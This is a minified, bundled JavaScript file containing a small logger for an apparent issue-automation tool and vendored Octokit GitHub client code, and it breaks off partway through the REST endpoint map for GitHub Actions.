import{createRequire as IS}from"node:module";var LS=Object.create;var{getPrototypeOf:DS,defineProperty:LG,getOwnPropertyNames:NS}=Object;var wS=Object.prototype.hasOwnProperty;var C0=(X,Q,J)=>{J=X!=null?LS(DS(X)):{};let Y=Q||!X||!X.__esModule?LG(J,"default",{value:X,enumerable:!0}):J;for(let W of NS(X))if(!wS.call(Y,W))LG(Y,W,{get:()=>X[W],enumerable:!0});return Y};var m=(X,Q)=>()=>(Q||X((Q={exports:{}}).exports,Q),Q.exports);var Y9=(X,Q)=>{for(var J in Q)LG(X,J,{get:Q[J],enumerable:!0,configurable:!0,set:(Y)=>Q[J]=()=>Y})};var $1=(X,Q)=>()=>(X&&(Q=X(X=0)),Q);var O0=IS(import.meta.url);class x2{minLevel;defaultOptions;constructor(X={}){this.minLevel=process.env.LOG_LEVEL?.toLowerCase()||"info",this.defaultOptions={timestamp:!0,...X}}debug(X,Q){this.log("debug",X,Q)}info(X,Q){this.log("info",X,Q)}warn(X,Q){this.log("warn",X,Q)}error(X,Q){let J;if(Q)J={error:Q instanceof Error?{message:Q.message,stack:Q.stack}:Q};this.log("error",X,J)}log(X,Q,J){if(!this.shouldLog(X))return;let Y=this.formatLogEntry(X,Q,J);switch(X){case"debug":console.debug(Y);break;case"info":console.info(Y);break;case"warn":console.warn(Y);break;case"error":console.error(Y);break}}shouldLog(X){let Q=["debug","info","warn","error"],J=Q.indexOf(this.minLevel);return Q.indexOf(X)>=J}formatLogEntry(X,Q,J){let Y=this.defaultOptions.timestamp?`[${new Date().toISOString()}]`:"",W=`[${X.toUpperCase()}]`,G=`${Y}${W} ${Q}`;if(J)try{let H=JSON.stringify(J,null,2);G+=`
${H}`}catch(H){G+=`
[Error serializing metadata]`}return G}setMinLevel(X){this.minLevel=X}getMinLevel(){return this.minLevel}logPhaseExecution(X,Q,J){let Y=`[PHASE:${X.toUpperCase()}] Issue #${Q} - ${J.status}`,W={phase:X,issueNumber:Q,...J};if(J.status==="failure")this.error(Y,W);else this.info(Y,W)}logTestExecution(X,Q){let J=`[TEST] Issue #${X} - ${Q.phase} - ${Q.passed?"PASSED":"FAILED"}`;this.info(J,Q)}logTrustScore(X,Q){let J=`[TRUST-SCORE] Issue #${X} - Score: ${Q.trustScore}`;this.info(J,Q)}}var V;var y1=$1(()=>{V=new x2});function GX(){if(typeof navigator==="object"&&"userAgent"in navigator)return navigator.userAgent;if(typeof process==="object"&&process.version!==void 0)return`Node.js/${process.version.substr(1)} (${process.platform}; ${process.arch})`;return"<environment undetectable>"}function EJ(X,Q,J,Y){if(typeof J!=="function")throw Error("method for before hook must be a function");if(!Y)Y={};if(Array.isArray(Q))return Q.reverse().reduce((W,G)=>{return EJ.bind(null,X,G,W,Y)},J)();return Promise.resolve().then(()=>{if(!X.registry[Q])return J(Y);return X.registry[Q].reduce((W,G)=>{return G.hook.bind(null,W,Y)},J)()})}function h2(X,Q,J,Y){let W=Y;if(!X.registry[J])X.registry[J]=[];if(Q==="before")Y=(G,H)=>{return Promise.resolve().then(W.bind(null,H)).then(G.bind(null,H))};if(Q==="after")Y=(G,H)=>{let $;return Promise.resolve().then(G.bind(null,H)).then((z)=>{return $=z,W($,H)}).then(()=>{return $})};if(Q==="error")Y=(G,H)=>{return Promise.resolve().then(G.bind(null,H)).catch(($)=>{return W($,H)})};X.registry[J].push({hook:Y,orig:W})}function y2(X,Q,J){if(!X.registry[Q])return;let Y=X.registry[Q].map((W)=>{return W.orig}).indexOf(J);if(Y===-1)return;X.registry[Q].splice(Y,1)}function u2(X,Q,J){let Y=m2(y2,null).apply(null,J?[Q,J]:[Q]);X.api={remove:Y},X.remove=Y,["before","error","after","wrap"].forEach((W)=>{let G=J?[Q,W,J]:[Q,W];X[W]=X.api[W]=m2(h2,null).apply(null,G)})}function Mk(){let X=Symbol("Singular"),Q={registry:{}},J=EJ.bind(null,Q,X);return u2(J,Q,X),J}function jk(){let X={registry:{}},Q=EJ.bind(null,X);return u2(Q,X),Q}var g2,m2,c2;var l2=$1(()=>{g2=Function.bind,m2=g2.bind(g2);c2={Singular:Mk,Collection:jk}});function Rk(X){if(!X)return{};return Object.keys(X).reduce((Q,J)=>{return Q[J.toLowerCase()]=X[J],Q},{})}function Lk(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let Q=Object.getPrototypeOf(X);if(Q===null)return!0;let J=Object.prototype.hasOwnProperty.call(Q,"constructor")&&Q.constructor;return typeof J==="function"&&J instanceof J&&Function.prototype.call(J)===Function.prototype.call(X)}function i2(X,Q){let J=Object.assign({},X);return Object.keys(Q).forEach((Y)=>{if(Lk(Q[Y]))if(!(Y in X))Object.assign(J,{[Y]:Q[Y]});else J[Y]=i2(X[Y],Q[Y]);else Object.assign(J,{[Y]:Q[Y]})}),J}function p2(X){for(let Q in X)if(X[Q]===void 0)delete X[Q];return X}function uG(X,Q,J){if(typeof Q==="string"){let[W,G]=Q.split(" ");J=Object.assign(G?{method:W,url:G}:{url:W},J)}else J=Object.assign({},Q);J.headers=Rk(J.headers),p2(J),p2(J.headers);let Y=i2(X||{},J);if(J.url==="/graphql"){if(X&&X.mediaType.previews?.length)Y.mediaType.previews=X.mediaType.previews.filter((W)=>!Y.mediaType.previews.includes(W)).concat(Y.mediaType.previews);Y.mediaType.previews=(Y.mediaType.previews||[]).map((W)=>W.replace(/-preview/,""))}return Y}function Dk(X,Q){let J=/\?/.test(X)?"&":"?",Y=Object.keys(Q);if(Y.length===0)return X;return X+J+Y.map((W)=>{if(W==="q")return"q="+Q.q.split("+").map(encodeURIComponent).join("+");return`${W}=${encodeURIComponent(Q[W])}`}).join("&")}function wk(X){return X.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g,"").split(/,/)}function Ik(X){let Q=X.match(Nk);if(!Q)return[];return Q.map(wk).reduce((J,Y)=>J.concat(Y),[])}function d2(X,Q){let J={__proto__:null};for(let Y of Object.keys(X))if(Q.indexOf(Y)===-1)J[Y]=X[Y];return J}function r2(X){return X.split(/(%[0-9A-Fa-f]{2})/g).map(function(Q){if(!/%[0-9A-Fa-f]/.test(Q))Q=encodeURI(Q).replace(/%5B/g,"[").replace(/%5D/g,"]");return Q}).join("")}function p7(X){return encodeURIComponent(X).replace(/[!'()*]/g,function(Q){return"%"+Q.charCodeAt(0).toString(16).toUpperCase()})}function F4(X,Q,J){if(Q=X==="+"||X==="#"?r2(Q):p7(Q),J)return p7(J)+"="+Q;else return Q}function l7(X){return X!==void 0&&X!==null}function mG(X){return X===";"||X==="&"||X==="?"}function Ck(X,Q,J,Y){var W=X[J],G=[];if(l7(W)&&W!=="")if(typeof W==="string"||typeof W==="number"||typeof W==="boolean"){if(W=W.toString(),Y&&Y!=="*")W=W.substring(0,parseInt(Y,10));G.push(F4(Q,W,mG(Q)?J:""))}else if(Y==="*")if(Array.isArray(W))W.filter(l7).forEach(function(H){G.push(F4(Q,H,mG(Q)?J:""))});else Object.keys(W).forEach(function(H){if(l7(W[H]))G.push(F4(Q,W[H],H))});else{let H=[];if(Array.isArray(W))W.filter(l7).forEach(function($){H.push(F4(Q,$))});else Object.keys(W).forEach(function($){if(l7(W[$]))H.push(p7($)),H.push(F4(Q,W[$].toString()))});if(mG(Q))G.push(p7(J)+"="+H.join(","));else if(H.length!==0)G.push(H.join(","))}else if(Q===";"){if(l7(W))G.push(p7(J))}else if(W===""&&(Q==="&"||Q==="?"))G.push(p7(J)+"=");else if(W==="")G.push("");return G}function Pk(X){return{expand:Sk.bind(null,X)}}function Sk(X,Q){var J=["+","#",".","/",";","?","&"];if(X=X.replace(/\{([^\{\}]+)\}|([^\{\}]+)/g,function(Y,W,G){if(W){let $="",z=[];if(J.indexOf(W.charAt(0))!==-1)$=W.charAt(0),W=W.substr(1);if(W.split(/,/g).forEach(function(U){var K=/([^:\*]*)(?::(\d+)|(\*))?/.exec(U);z.push(Ck(Q,$,K[1],K[2]||K[3]))}),$&&$!=="+"){var H=",";if($==="?")H="&";else if($!=="#")H=$;return(z.length!==0?$:"")+z.join(H)}else return z.join(",")}else return r2(G)}),X==="/")return X;else return X.replace(/\/$/,"")}function n2(X){let Q=X.method.toUpperCase(),J=(X.url||"/").replace(/:([a-z]\w+)/g,"{$1}"),Y=Object.assign({},X.headers),W,G=d2(X,["method","baseUrl","url","headers","request","mediaType"]),H=Ik(J);if(J=Pk(J).expand(G),!/^http/.test(J))J=X.baseUrl+J;let $=Object.keys(X).filter((K)=>H.includes(K)).concat("baseUrl"),z=d2(G,$);if(!/application\/octet-stream/i.test(Y.accept)){if(X.mediaType.format)Y.accept=Y.accept.split(/,/).map((K)=>K.replace(/application\/vnd(\.\w+)(\.v3)?(\.\w+)?(\+json)?$/,`application/vnd$1$2.${X.mediaType.format}`)).join(",");if(J.endsWith("/graphql")){if(X.mediaType.previews?.length){let K=Y.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g)||[];Y.accept=K.concat(X.mediaType.previews).map((B)=>{let q=X.mediaType.format?`.${X.mediaType.format}`:"+json";return`application/vnd.github.${B}-preview${q}`}).join(",")}}}if(["GET","HEAD"].includes(Q))J=Dk(J,z);else if("data"in z)W=z.data;else if(Object.keys(z).length)W=z;if(!Y["content-type"]&&typeof W<"u")Y["content-type"]="application/json; charset=utf-8";if(["PATCH","PUT"].includes(Q)&&typeof W>"u")W="";return Object.assign({method:Q,url:J,headers:Y},typeof W<"u"?{body:W}:null,X.request?{request:X.request}:null)}function Ek(X,Q,J){return n2(uG(X,Q,J))}function a2(X,Q){let J=uG(X,Q),Y=Ek.bind(null,J);return Object.assign(Y,{DEFAULTS:J,defaults:a2.bind(null,J),merge:uG.bind(null,J),parse:n2})}var Fk="0.0.0-development",Ok,Ak,Nk,o2;var s2=$1(()=>{Ok=`octokit-endpoint.js/${Fk} ${GX()}`,Ak={method:"GET",baseUrl:"https://api.github.com",headers:{accept:"application/vnd.github.v3+json","user-agent":Ok},mediaType:{format:""}};Nk=/\{[^{}}]+\}/g;o2=a2(null,Ak)});function _k(X){if(typeof X!=="string")return d7;let Q=X.indexOf(";"),J=Q!==-1?X.slice(0,Q).trim():X.trim();if(Tk.test(J)===!1)return d7;let Y={type:J.toLowerCase(),parameters:new cG};if(Q===-1)return Y;let W,G,H;t2.lastIndex=Q;while(G=t2.exec(X)){if(G.index!==Q)return d7;if(Q+=G[0].length,W=G[1].toLowerCase(),H=G[2],H[0]==='"')H=H.slice(1,H.length-1),e2.test(H)&&(H=H.replace(e2,"$1"));Y.parameters[W]=H}if(Q!==X.length)return d7;return Y}var cG=function(){},t2,e2,Tk,d7,lG;var XB=$1(()=>{cG.prototype=Object.create(null);t2=/; *([!#$%&'*+.^\w`|~-]+)=("(?:[\v\u0020\u0021\u0023-\u005b\u005d-\u007e\u0080-\u00ff]|\\[\v\u0020-\u00ff])*"|[!#$%&'*+.^\w`|~-]+) */gu,e2=/\\([\v\u0020-\u00ff])/gu,Tk=/^[!#$%&'*+.^\w|~-]+\/[!#$%&'*+.^\w|~-]+$/u,d7={type:"",parameters:new cG};Object.freeze(d7.parameters);Object.freeze(d7);lG=_k});var i7;var QB=$1(()=>{i7=class i7 extends Error{name;status;request;response;constructor(X,Q,J){super(X);if(this.name="HttpError",this.status=Number.parseInt(Q),Number.isNaN(this.status))this.status=0;if("response"in J)this.response=J.response;let Y=Object.assign({},J.request);if(J.request.headers.authorization)Y.headers=Object.assign({},J.request.headers,{authorization:J.request.headers.authorization.replace(/(?<! ) .*$/," [REDACTED]")});Y.url=Y.url.replace(/\bclient_secret=\w+/g,"client_secret=[REDACTED]").replace(/\baccess_token=\w+/g,"access_token=[REDACTED]"),this.request=Y}}});function xk(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let Q=Object.getPrototypeOf(X);if(Q===null)return!0;let J=Object.prototype.hasOwnProperty.call(Q,"constructor")&&Q.constructor;return typeof J==="function"&&J instanceof J&&Function.prototype.call(J)===Function.prototype.call(X)}async function JB(X){let Q=X.request?.fetch||globalThis.fetch;if(!Q)throw Error("fetch is not set. Please pass a fetch implementation as new Octokit({ request: { fetch }}). Learn more at https://github.com/octokit/octokit.js/#fetch-missing");let J=X.request?.log||console,Y=X.request?.parseSuccessResponseBody!==!1,W=xk(X.body)||Array.isArray(X.body)?JSON.stringify(X.body):X.body,G=Object.fromEntries(Object.entries(X.headers).map(([B,q])=>[B,String(q)])),H;try{H=await Q(X.url,{method:X.method,body:W,redirect:X.request?.redirect,headers:G,signal:X.request?.signal,...X.body&&{duplex:"half"}})}catch(B){let q="Unknown Error";if(B instanceof Error){if(B.name==="AbortError")throw B.status=500,B;if(q=B.message,B.name==="TypeError"&&"cause"in B){if(B.cause instanceof Error)q=B.cause.message;else if(typeof B.cause==="string")q=B.cause}}let Z=new i7(q,500,{request:X});throw Z.cause=B,Z}let{status:$,url:z}=H,U={};for(let[B,q]of H.headers)U[B]=q;let K={url:z,status:$,headers:U,data:""};if("deprecation"in U){let B=U.link&&U.link.match(/<([^<>]+)>; rel="deprecation"/),q=B&&B.pop();J.warn(`[@octokit/request] "${X.method} ${X.url}" is deprecated. It is scheduled to be removed on ${U.sunset}${q?`. See ${q}`:""}`)}if($===204||$===205)return K;if(X.method==="HEAD"){if($<400)return K;throw new i7(H.statusText,$,{response:K,request:X})}if($===304)throw K.data=await pG(H),new i7("Not modified",$,{response:K,request:X});if($>=400)throw K.data=await pG(H),new i7(hk(K.data),$,{response:K,request:X});return K.data=Y?await pG(H):H.body,K}async function pG(X){let Q=X.headers.get("content-type");if(!Q)return X.text().catch(()=>"");let J=lG(Q);if(fk(J)){let Y="";try{return Y=await X.text(),JSON.parse(Y)}catch(W){return Y}}else if(J.type.startsWith("text/")||J.parameters.charset?.toLowerCase()==="utf-8")return X.text().catch(()=>"");else return X.arrayBuffer().catch(()=>new ArrayBuffer(0))}function fk(X){return X.type==="application/json"||X.type==="application/scim+json"}function hk(X){if(typeof X==="string")return X;if(X instanceof ArrayBuffer)return"Unknown error";if("message"in X){let Q="documentation_url"in X?` - ${X.documentation_url}`:"";return Array.isArray(X.errors)?`${X.message}: ${X.errors.map((J)=>JSON.stringify(J)).join(", ")}${Q}`:`${X.message}${Q}`}return`Unknown error: ${JSON.stringify(X)}`}function dG(X,Q){let J=X.defaults(Q);return Object.assign(function(W,G){let H=J.merge(W,G);if(!H.request||!H.request.hook)return JB(J.parse(H));let $=(z,U)=>{return JB(J.parse(J.merge(z,U)))};return Object.assign($,{endpoint:J,defaults:dG.bind(null,J)}),H.request.hook($,H)},{endpoint:J,defaults:dG.bind(null,J)})}var bk="9.2.4",vk,O4;var iG=$1(()=>{s2();XB();QB();vk={headers:{"user-agent":`octokit-request.js/${bk} ${GX()}`}};O4=dG(o2,vk)});function gk(X){return`Request failed due to following response errors:
`+X.errors.map((Q)=>` - ${Q.message}`).join(`
`)}function lk(X,Q,J){if(J){if(typeof Q==="string"&&"query"in J)return Promise.reject(Error('[@octokit/graphql] "query" cannot be used as variable name'));for(let H in J){if(!ck.includes(H))continue;return Promise.reject(Error(`[@octokit/graphql] "${H}" cannot be used as variable name`))}}let Y=typeof Q==="string"?Object.assign({query:Q},J):Q,W=Object.keys(Y).reduce((H,$)=>{if(uk.includes($))return H[$]=Y[$],H;if(!H.variables)H.variables={};return H.variables[$]=Y[$],H},{}),G=Y.baseUrl||X.endpoint.DEFAULTS.baseUrl;if(YB.test(G))W.url=G.replace(YB,"/api/graphql");return X(W).then((H)=>{if(H.data.errors){let $={};for(let z of Object.keys(H.headers))$[z]=H.headers[z];throw new mk(W,$,H.data)}return H.data.data})}function rG(X,Q){let J=X.defaults(Q);return Object.assign((W,G)=>{return lk(J,W,G)},{defaults:rG.bind(null,J),endpoint:J.endpoint})}function WB(X){return rG(X,{method:"POST",url:"/graphql"})}var yk="0.0.0-development",mk,uk,ck,YB,R00;var GB=$1(()=>{iG();mk=class extends Error{constructor(X,Q,J){super(gk(J));if(this.request=X,this.headers=Q,this.response=J,this.errors=J.errors,this.data=J.data,Error.captureStackTrace)Error.captureStackTrace(this,this.constructor)}name="GraphqlResponseError";errors;data},uk=["method","baseUrl","url","headers","request","query","mediaType","operationName"],ck=["query","method","url"],YB=/\/api\/v3\/?$/;R00=rG(O4,{headers:{"user-agent":`octokit-graphql.js/${yk} ${GX()}`},method:"POST",url:"/graphql"})});async function dk(X){let Q=pk(X),J=X.startsWith("v1.")||X.startsWith("ghs_"),Y=X.startsWith("ghu_");return{type:"token",token:X,tokenType:Q?"app":J?"installation":Y?"user-to-server":"oauth"}}function ik(X){if(X.split(/\./).length===3)return`bearer ${X}`;return`token ${X}`}async function rk(X,Q,J,Y){let W=Q.endpoint.merge(J,Y);return W.headers.authorization=ik(X),Q(W)}var nG="(?:[a-zA-Z0-9_-]+)",HB="\\.",$B,pk,zB=function(Q){if(!Q)throw Error("[@octokit/auth-token] No token passed to createTokenAuth");if(typeof Q!=="string")throw Error("[@octokit/auth-token] Token passed to createTokenAuth is not a string");return Q=Q.replace(/^(token|bearer) +/i,""),Object.assign(dk.bind(null,Q),{hook:rk.bind(null,Q)})};var UB=$1(()=>{$B=new RegExp(`^${nG}${HB}${nG}${HB}${nG}$`),pk=$B.test.bind($B)});var aG="6.1.6";var KB=()=>{};function ok(X={}){if(typeof X.debug!=="function")X.debug=VB;if(typeof X.info!=="function")X.info=VB;if(typeof X.warn!=="function")X.warn=nk;if(typeof X.error!=="function")X.error=ak;return X}var VB=()=>{},nk,ak,BB,oG;var qB=$1(()=>{l2();iG();GB();UB();KB();nk=console.warn.bind(console),ak=console.error.bind(console);BB=`octokit-core.js/${aG} ${GX()}`;oG=class oG{static VERSION=aG;static defaults(X){return class extends this{constructor(...J){let Y=J[0]||{};if(typeof X==="function"){super(X(Y));return}super(Object.assign({},X,Y,Y.userAgent&&X.userAgent?{userAgent:`${Y.userAgent} ${X.userAgent}`}:null))}}}static plugins=[];static plugin(...X){let Q=this.plugins;return class extends this{static plugins=Q.concat(X.filter((Y)=>!Q.includes(Y)))}}constructor(X={}){let Q=new c2.Collection,J={baseUrl:O4.endpoint.DEFAULTS.baseUrl,headers:{},request:Object.assign({},X.request,{hook:Q.bind(null,"request")}),mediaType:{previews:[],format:""}};if(J.headers["user-agent"]=X.userAgent?`${X.userAgent} ${BB}`:BB,X.baseUrl)J.baseUrl=X.baseUrl;if(X.previews)J.mediaType.previews=X.previews;if(X.timeZone)J.headers["time-zone"]=X.timeZone;if(this.request=O4.defaults(J),this.graphql=WB(this.request).defaults(J),this.log=ok(X.log),this.hook=Q,!X.authStrategy)if(!X.auth)this.auth=async()=>({type:"unauthenticated"});else{let W=zB(X.auth);Q.wrap("request",W.hook),this.auth=W}else{let{authStrategy:W,...G}=X,H=W(Object.assign({request:this.request,log:this.log,octokit:this,octokitOptions:G},X.auth));Q.wrap("request",H.hook),this.auth=H}let Y=this.constructor;for(let W=0;W<Y.plugins.length;++W)Object.assign(this,Y.plugins[W](this,X))}request;graphql;log;hook;auth}});var ZB="5.3.1";var MB=()=>{};function sG(X){X.hook.wrap("request",(Q,J)=>{X.log.debug("request",J);let Y=Date.now(),W=X.request.endpoint.parse(J),G=W.url.replace(J.baseUrl,"");return Q(J).then((H)=>{let $=H.headers["x-github-request-id"];return X.log.info(`${W.method} ${G} - ${H.status} with id ${$} in ${Date.now()-Y}ms`),H}).catch((H)=>{let $=H.response?.headers["x-github-request-id"]||"UNKNOWN";throw X.log.error(`${W.method} ${G} - ${H.status} with id ${$} in ${Date.now()-Y}ms`),H})})}var jB=$1(()=>{MB();sG.VERSION=ZB});function tk(X){if(!X.data)return{...X,data:[]};if(!(("total_count"in X.data)&&!("url"in X.data)))return X;let J=X.data.incomplete_results,Y=X.data.repository_selection,W=X.data.total_count;delete X.data.incomplete_results,delete X.data.repository_selection,delete X.data.total_count;let G=Object.keys(X.data)[0],H=X.data[G];if(X.data=H,typeof J<"u")X.data.incomplete_results=J;if(typeof Y<"u")X.data.repository_selection=Y;return X.data.total_count=W,X}function tG(X,Q,J){let Y=typeof Q==="function"?Q.endpoint(J):X.request.endpoint(Q,J),W=typeof Q==="function"?Q:X.request,G=Y.method,H=Y.headers,$=Y.url;return{[Symbol.asyncIterator]:()=>({async next(){if(!$)return{done:!0};try{let z=await W({method:G,url:$,headers:H}),U=tk(z);return $=((U.headers.link||"").match(/<([^<>]+)>;\s*rel="next"/)||[])[1],{value:U}}catch(z){if(z.status!==409)throw z;return $="",{value:{status:200,headers:{},data:[]}}}}})}}function FB(X,Q,J,Y){if(typeof J==="function")Y=J,J=void 0;return OB(X,[],tG(X,Q,J)[Symbol.asyncIterator](),Y)}function OB(X,Q,J,Y){return J.next().then((W)=>{if(W.done)return Q;let G=!1;function H(){G=!0}if(Q=Q.concat(Y?Y(W.value,H):W.value.data),G)return Q;return OB(X,Q,J,Y)})}function eG(X){return{paginate:Object.assign(FB.bind(null,X),{iterator:tG.bind(null,X)})}}var sk="0.0.0-development",h00;var AB=$1(()=>{h00=Object.assign(FB,{iterator:tG});eG.VERSION=sk});var XH="13.5.0";var RB=()=>{};var ek,LB;var DB=$1(()=>{ek={actions:{addCustomLabelsToSelfHostedRunnerForOrg:["POST /orgs/{org}/actions/runners/{runner_id}/labels"],addCustomLabelsToSelfHostedRunnerForRepo:["POST /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],addRepoAccessToSelfHostedRunnerGroupInOrg:["PUT /orgs/{org}/actions/runner-groups/{runner_group_id}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],approveWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/approve"],cancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/cancel"],createEnvironmentVariable:["POST /repos/{owner}/{repo}/environments/{environment_name}/variables"],createHostedRunnerForOrg:["POST /orgs/{org}/actions/hosted-runners"],createOrUpdateEnvironmentSecret:["PUT /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/actions/secrets/{secret_name}"],createOrgVariable:["POST /orgs/{org}/actions/variables"],createRegistrationTokenForOrg:["POST /orgs/{org}/actions/runners/registration-token"],createRegistrationTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/registration-token"],createRemoveTokenForOrg:["POST /orgs/{org}/actions/runners/remove-token"],createRemoveTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/remove-token"],createRepoVariable:["POST /repos/{owner}/{repo}/actions/variables"],createWorkflowDispatch:["POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches"],deleteActionsCacheById:["DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}"],deleteActionsCacheByKey:["DELETE /repos/{owner}/{repo}/actions/caches{?key,ref}"],deleteArtifact:["DELETE /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],deleteEnvironmentSecret:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],deleteEnvironmentVariable:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],deleteHostedRunnerForOrg:["DELETE /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],deleteOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}"],deleteOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/actions/secrets/{secret_name}"],deleteRepoVariable:["DELETE /repos/{owner}/{repo}/actions/variables/{name}"],deleteSelfHostedRunnerFromOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}"],deleteSelfHostedRunnerFromRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}"],deleteWorkflowRun:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}"],deleteWorkflowRunLogs:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],disableSelectedRepositoryGithubActionsOrganization:["DELETE /orgs/{org}/actions/permissions/repositories/{repository_id}"],disableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/disable"],downloadArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}/{archive_format}"],downloadJobLogsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs"],downloadWorkflowRunAttemptLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/logs"],downloadWorkflowRunLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],enableSelectedRepositoryGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories/{repository_id}"],enableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/enable"],forceCancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/force-cancel"],generateRunnerJitconfigForOrg:["POST /orgs/{org}/actions/runners/generate-jitconfig"],generateRunnerJitconfigForRepo:["POST /repos/{owner}/{repo}/actions/runners/generate-jitconfig"],getActionsCacheList:["GET /repos/{owner}/{repo}/actions/caches"],getActionsCacheUsage:["GET /repos/{owner}/{repo}/actions/cache/usage"],getActionsCacheUsageByRepoForOrg:["GET /orgs/{org}/actions/cache/usage-by-repository"],getActionsCacheUsageForOrg:["GET /orgs/{org}/actions/cache/usage"],getAllowedActionsOrganization:["GET /orgs/{org}/actions/permissions/selected-actions"],getAllowedActionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/selected-actions"],getArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],getCustomOidcSubClaimForRepo:["GET /repos/{owner}/{repo}/actions/oidc/customization/sub"],getEnvironmentPublicKey:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/public-key"],getEnvironmentSecret:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],getEnvironmentVariable:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],getGithubActionsDefaultWorkflowPermissionsOrganization:["GET /orgs/{org}/actions/permissions/workflow"],getGithubActionsDefaultWorkflowPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/workflow"],getGithubActionsPermissionsOrganization:["GET /orgs/{org}/actions/permissions"],getGithubActionsPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions"],getHostedRunnerForOrg:["GET /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],getHostedRunnersGithubOwnedImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/github-owned"],getHostedRunnersLimitsForOrg:["GET /orgs/{org}/actions/hosted-runners/limits"],getHostedRunnersMachineSpecsForOrg:["GET /orgs/{org}/actions/hosted-runners/machine-sizes"],getHostedRunnersPartnerImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/partner"],getHostedRunnersPlatformsForOrg:["GET /orgs/{org}/actions/hosted-runners/platforms"],getJobForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}"],getOrgPublicKey:["GET /orgs/{org}/actions/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}"],getOrgVariable:["GET /orgs/{org}/actions/variables/{name}"],getPendingDeploymentsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],getRepoPermissions:["GET /repos/{owner}/{repo}/actions/permissions",{},{renamed:["actions","getGithubActionsPermissionsRepository"]}],getRepoPublicKey:["GET /repos/{owner}/{repo}/actions/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/actions/secrets/{secret_name}"],getRepoVariable:["GET /repos/{owner}/{repo}/actions/variables/{name}"],getReviewsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/approvals"],getSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}"],getSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}"],getWorkflow:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}"],getWorkflowAccessToRepository:["GET /repos/{owner}/{repo}/actions/permissions/access"],getWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}"],getWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}"],getWorkflowRunUsage:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/timing"],getWorkflowUsage:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/timing"],listArtifactsForRepo:["GET /repos/{owner}/{repo}/actions/artifacts"],listEnvironmentSecrets:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets"],listEnvironmentVariables:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables"],listGithubHostedRunnersInGroupForOrg:["GET /orgs/{org}/actions/runner-groups/{runner_group_id}/hosted-runners"],listHostedRunnersForOrg:["GET /orgs/{org}/actions/hosted-runners"],listJobsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs"],listJobsForWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/jobs"],listLabelsForSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}/labels"],listLabelsForSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],listOrgSecrets:["GET /orgs/{org}/actions/secrets"],listOrgVariables:["GET /orgs/{org}/actions/variables"],listRepoOrganizationSecrets:["GET /repos/{owner}/{repo}/actions/organization-secrets"],listRepoOrganizationVariables:["GET 